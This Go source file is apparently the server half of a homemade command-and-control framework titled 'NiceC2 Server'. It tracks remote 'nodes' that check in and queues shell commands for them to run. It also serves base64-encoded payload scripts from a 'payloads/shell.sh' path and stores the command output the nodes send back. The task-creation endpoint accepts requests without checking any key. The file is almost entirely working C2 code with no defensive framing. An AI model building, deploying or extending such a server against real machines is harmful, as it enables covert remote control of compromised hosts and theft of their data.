package main

import (
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"
)

// Banner for the application
const banner string = `

███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
████╗  ██║██║██╔════╝██╔════╝██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██╔██╗ ██║██║██║     █████╗  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║╚██╗██║██║██║     ██╔══╝  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██║ ╚████║██║╚██████╗███████╗╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                                                  

`

// Command ID. This will keep going up as commands are added to the queue.
// It should never be bellow 0
var taskID int = 1

// The main array of all nodes that have checked in.
var nodes []node = read_nodes_from_file()

// The array holding the queue of tasks
var task_queue []Task

func main() {

	// Make some hard coded tasks
	// task_queue = append(task_queue, create_task("NodeName", "run", "This Command"))
	// task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touchsd HelloThere"))
	// task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere1"))
	// task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere2"))
	// task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "ls"))
	// task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "pwd"))
	// task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "ls /System/DriverKit/Runtime/System/Library/Frameworks/Kernel.framework/Resources"))

	fmt.Println("The current task queue")
	fmt.Println(task_queue)
	fmt.Println()
	fmt.Println()

	handleRequests()

}

// Api endpoints and stuff
func handleRequests() {

	http.HandleFunc("/checkin", nodeCheckIn)
	http.HandleFunc("/node_response", node_response)
	http.HandleFunc("/create_task", create_task_API)
	http.HandleFunc("/get_nodes", get_nodes)
	http.HandleFunc("/get_tasks", get_tasks)
	// http.HandleFunc("/getPayload", getPayload)

	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
}

func get_tasks(w http.ResponseWriter, req *http.Request) {
	// Decode te JSON
	decoder := json.NewDecoder(req.Body)

	fmt.Println(decoder)
	fmt.Println(req.Body)

	json_tasks, err := sliceToJSON(task_queue)
	if err != nil {
		fmt.Println("Error converting nodes slice, to json string")
	}

	fmt.Println("/////////////////////////////////////")

	fmt.Println(json_tasks)
	fmt.Println("/////////////////////////////////////")

	// json, _ := json.Marshal(json_tasks)

	fmt.Fprintf(w, json_tasks)
}

func get_nodes(w http.ResponseWriter, req *http.Request) {

	fmt.Println("New node list requested")

	fmt.Println(req.Body)

	// Decode te JSON
	decoder := json.NewDecoder(req.Body)

	fmt.Println(decoder)
	fmt.Println(req.Body)

	json_nodes, err := sliceToJSON(nodes)
	if err != nil {
		fmt.Println("Error converting nodes slice, to json string")
	}

	fmt.Println(json_nodes)

	json, _ := json.Marshal(nodes)

	fmt.Fprintf(w, string(json))

	// if err2 != nil {
	// 	log.Fatal(err2)
	// }

}

type task_create_request struct {
	NodeID  string `json:"NodeID"`
	Task    string `json:"Task"`
	Details string `json:"Details"`
	Key     string `json:"Key"`
}

func create_task_API(w http.ResponseWriter, req *http.Request) {

	fmt.Println("New task has been recieved!")

	fmt.Println(req.Body)

	// Decode the json body
	decoder := json.NewDecoder(req.Body)

	fmt.Println(decoder)
	fmt.Println(req.Body)

	var task_create_request task_create_request

	err := decoder.Decode(&task_create_request)
	if err != nil {

		fmt.Println("There was an error decoding the JSON in the task response")
		panic(err)
	}

	fmt.Println(task_create_request)

	// Now we have the result.

	// correct for if a hostname is passed to the system
	for _, node := range nodes {
		if node.Hostname == task_create_request.NodeID {
			task_create_request.NodeID = node.ID
		}
	}

	fmt.Println("🤔")

	var new_task = create_task(task_create_request.NodeID, task_create_request.Task, task_create_request.Details)

	task_queue = append(task_queue, new_task)

	var response = string(`{"taskID" : "` + new_task.TaskID + `"}`)

	fmt.Println("API task has now been added to queue")

	// Send the response back
	fmt.Fprintf(w, response)

}

// Function for that runs each time the node checks in
func nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	var blank_response = string(`
	{
		"taskID": "0", 
		"task": "",  
		"arg" : ""
		
	}`)

	// Get's the current time
	dt := time.Now()

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node_that_checked_in check_in
	err := decoder.Decode(&node_that_checked_in)
	if err != nil {
		panic(err)
	}

	// Adding the node to the list (Needs to be only if new node)

	if is_new_node(node_that_checked_in.ID) == true {
		fmt.Println("Damn look it's a new node!")
		nodes = append(nodes, createNode(node_that_checked_in.ID, node_that_checked_in.Hostname, node_that_checked_in.Platform, dt.String()))
	} else {

		update_node(node_that_checked_in.ID, dt.String())

		fmt.Println("Node re-checked in")
	}

	// Output something pretty
	fmt.Println()
	fmt.Println("============= New Check in =============")

	fmt.Println("ID: " + node_that_checked_in.ID)
	fmt.Println("Hostname: " + node_that_checked_in.Hostname)
	fmt.Println("Platform: " + node_that_checked_in.Platform)
	fmt.Println("Time: " + dt.String())

	fmt.Println("============= ----------- =============")

	// Find that nodes task
	Task_location, find_task_message := find_task_unsent(node_that_checked_in.ID)

	// This handles sending back a blank response if no task is found
	if find_task_message != "" {
		fmt.Println("No task for node")

		// Send the blank response back
		fmt.Fprintf(w, blank_response)

	} else {

		var response = string(`{"taskID": "` + task_queue[Task_location].TaskID + `", "task": "` + task_queue[Task_location].Action + `",  "arg": "` + task_queue[Task_location].Content + `"}`)

		// Stops the same command from being sent multiple times
		task_queue[Task_location].Progress = "sent"

		// Send the response back
		fmt.Fprintf(w, response)
	}

	fmt.Println(task_queue)

	save_nodes_to_file()
}

// Handles when a node sends back the result of a task (Command output)
func node_response(w http.ResponseWriter, req *http.Request) {

	fmt.Println("A TASK HAS BEEN COMPLETED!!!!!s")

	fmt.Println(req.Body)

	// Decode the json body
	decoder := json.NewDecoder(req.Body)

	var response_to_task Task_Response

	err := decoder.Decode(&response_to_task)
	if err != nil {

		fmt.Println("There was an error decoding the JSON in the task response")
		panic(err)
	}

	fmt.Println(response_to_task)

	// Now we have the result.

	// change task in task list to complete
	task_location, find_task_error := find_task_by_id(response_to_task.TaskID)
	if find_task_error != "" {
		fmt.Println(find_task_error)
	}

	task_queue[task_location].Progress = response_to_task.Progress

	// Write result to file. Temporary measure
	f, err := os.Create(response_to_task.TaskID + ".txt")
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
	_, err2 := f.WriteString(response_to_task.Result + "\n")
	if err2 != nil {
		log.Fatal(err2)
	}
	f.Close()

	// add the result to the task array
	task_queue[task_location].Result = response_to_task.Result

	fmt.Println("NODE RESPONSE RECORDED!")

	fmt.Println(task_queue[task_location])

	fmt.Println()

}

// Handles gathering a file for the node to recieve
func nodeSendFile(w http.ResponseWriter, req *http.Request) {

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	script := read_script("payloads/shell.sh")

	var response = []byte(`
	{
		"ID": "` + node.ID + `",
		"command": "File",
		"details": "` + script + `"
	}`)

	// Sending the reponse
	fmt.Fprintf(w, string(response))

}

// Reads and encodes a script. Read to send to the node
func read_script(path string) string {

	// Read the file
	bFile, _ := ioutil.ReadFile(path)
	script := string(bFile)
	// script = strings.Replace(script, "\n", "", -1)

	// fmt.Println(script)

	// here is where we turn the file into some nice data I think
	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))

	return encoded_script

}

// sliceToJSON converts a slice of structs to a JSON string
func sliceToJSON(slice interface{}) (string, error) {
	// Marshal the slice of structs into a JSON string
	jsonBytes, err := json.Marshal(slice)
	if err != nil {
		return "", err
	}

	// Convert the JSON bytes to a string and return it
	return string(jsonBytes), nil
}
